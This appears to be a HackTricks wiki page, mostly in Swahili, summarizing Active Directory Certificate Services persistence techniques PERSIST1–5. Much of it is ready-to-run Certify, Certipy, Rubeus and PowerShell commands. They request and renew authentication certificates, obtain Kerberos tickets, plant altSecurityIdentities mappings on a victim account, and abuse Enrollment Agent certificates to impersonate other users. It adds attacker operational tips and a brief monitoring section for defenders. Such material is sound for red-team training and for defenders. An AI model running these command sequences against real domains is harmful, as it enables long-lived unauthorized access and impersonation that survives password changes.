# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Hii ni muhtasari mdogo wa sura za kudumu za akaunti kutoka kwa utafiti mzuri wa [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Kuelewa Wizi wa Akreditif za Watumiaji Wanaofanya Kazi kwa kutumia Vyeti – PERSIST1

Katika hali ambapo cheti kinachoruhusu uthibitisho wa kikoa kinaweza kuombwa na mtumiaji, mshambuliaji ana fursa ya kuomba na kuiba cheti hiki ili kudumisha uwepo kwenye mtandao. Kwa kawaida, kiolezo cha `User` katika Active Directory kinaruhusu maombi kama haya, ingawa wakati mwingine kinaweza kuzuiliwa.

Kwa kutumia [Certify](https://github.com/GhostPack/Certify) au [Certipy](https://github.com/ly4k/Certipy), unaweza kutafuta violezo vilivyowezeshwa vinavyoruhusu uthibitisho wa mteja na kisha kuomba moja:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Nguvu ya cheti inategemea uwezo wake wa kuthibitisha kama mtumiaji anayehusiana nacho, bila kujali mabadiliko ya nenosiri, mradi tu cheti kikiwa halali.

Unaweza kubadilisha PEM kuwa PFX na kuitumia kupata TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Kumbuka: Iwapo inachanganywa na mbinu nyingine (angalia sehemu za THEFT), uthibitisho wa msingi wa cheti unaruhusu ufikiaji wa kudumu bila kugusa LSASS na hata kutoka kwa muktadha usio na kiwango cha juu.

## Kupata Uthibitisho wa Mashine kwa kutumia Vyeti - PERSIST2

Iwapo mshambuliaji ana mamlaka ya juu kwenye mwenyeji, wanaweza kujiandikisha kwa akaunti ya mashine ya mfumo ulioathiriwa kwa cheti wakitumia kigezo cha `Machine` cha kawaida. Kujiandikisha kama mashine kunaruhusu S4U2Self kwa huduma za ndani na kunaweza kutoa uthibitisho wa kudumu wa mwenyeji:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Extending Persistence Through Certificate Renewal - PERSIST3

Kunyanyua muda wa uhalali na kipindi cha upya wa mifano ya vyeti kunaruhusu mshambuliaji kudumisha ufikiaji wa muda mrefu. Ikiwa una cheti kilichotolewa hapo awali na funguo yake ya faragha, unaweza kukiunda upya kabla ya kuisha ili kupata akreditivu mpya, ya muda mrefu bila kuacha mabaki ya maombi yanayohusiana na msingi wa awali.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Ushauri wa operesheni: Fuata muda wa maisha ya faili za PFX zinazoshikiliwa na mshambuliaji na upya mapema. Upya unaweza pia kusababisha vyeti vilivyosasishwa kujumuisha kiambatisho cha ramani ya SID ya kisasa, na kuviweka vinatumika chini ya sheria kali za ramani za DC (angalia sehemu inayofuata).

## Kupanda Ramani za Vyeti Zenye Ufafanuzi (altSecurityIdentities) – PERSIST4

Ikiwa unaweza kuandika kwenye sifa ya `altSecurityIdentities` ya akaunti lengwa, unaweza kuweka ramani wazi ya cheti kinachodhibitiwa na mshambuliaji kwa akaunti hiyo. Hii inabaki kuwa na nguvu hata baada ya mabadiliko ya nywila na, unapokuwa ukitumia muundo wa ramani wenye nguvu, inabaki kufanya kazi chini ya utekelezaji wa kisasa wa DC.

Mchakato wa juu:

1. Pata au tolea cheti cha uthibitishaji wa mteja unachodhibiti (mfano, jiandikishe kwenye template ya `User` kama wewe mwenyewe).
2. Toa kitambulisho chenye nguvu kutoka kwa cheti (Mtoaji+Serial, SKI, au SHA1-PublicKey).
3. Ongeza ramani wazi kwenye `altSecurityIdentities` ya mhusika wa kisa kwa kutumia kitambulisho hicho.
4. Thibitisha na cheti chako; DC inakifanya kuwa na nguvu kwa mhusika kupitia ramani wazi.

Mfano (PowerShell) ukitumia ramani yenye nguvu ya Mtoaji+Serial:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Kisha uthibitishe na PFX yako. Certipy itapata TGT moja kwa moja:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
```
Notes
- Tumia aina za ramani zenye nguvu tu: X509IssuerSerialNumber, X509SKI, au X509SHA1PublicKey. Mifumo dhaifu (Subject/Issuer, Subject-only, RFC822 email) imeondolewa na inaweza kuzuiwa na sera ya DC.
- Mnyororo wa cheti lazima ujenge hadi mzizi unaotambulika na DC. CAs za biashara katika NTAuth kwa kawaida zinatambulika; mazingira mengine pia yanatambua CAs za umma.

Kwa maelezo zaidi kuhusu ramani dhaifu za wazi na njia za shambulio, angalia:

{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

Ikiwa unapata cheti halali cha Certificate Request Agent/Enrollment Agent, unaweza kutunga cheti mpya zenye uwezo wa kuingia kwa niaba ya watumiaji kwa hiari na kuweka PFX ya wakala mtandaoni kama tokeni ya kudumu. Njia ya matumizi:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Revocation of the agent certificate or template permissions is required to evict this persistence.

## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence

Microsoft KB5014754 introduced Strong Certificate Mapping Enforcement on domain controllers. Since February 11, 2025, DCs default to Full Enforcement, rejecting weak/ambiguous mappings. Practical implications:

- Pre-2022 certificates that lack the SID mapping extension may fail implicit mapping when DCs are in Full Enforcement. Attackers can maintain access by either renewing certificates through AD CS (to obtain the SID extension) or by planting a strong explicit mapping in `altSecurityIdentities` (PERSIST4).
- Explicit mappings using strong formats (Issuer+Serial, SKI, SHA1-PublicKey) continue to work. Weak formats (Issuer/Subject, Subject-only, RFC822) can be blocked and should be avoided for persistence.

Administrators should monitor and alert on:
- Changes to `altSecurityIdentities` and issuance/renewals of Enrollment Agent and User certificates.
- CA issuance logs for on-behalf-of requests and unusual renewal patterns.

## References

- Microsoft. KB5014754: Mabadiliko ya uthibitishaji wa msingi wa cheti kwenye kudhibiti eneo la Windows (muda wa utekelezaji na ramani za nguvu).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy Wiki – Rejea ya Amri (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference

{{#include ../../../banners/hacktricks-training.md}}
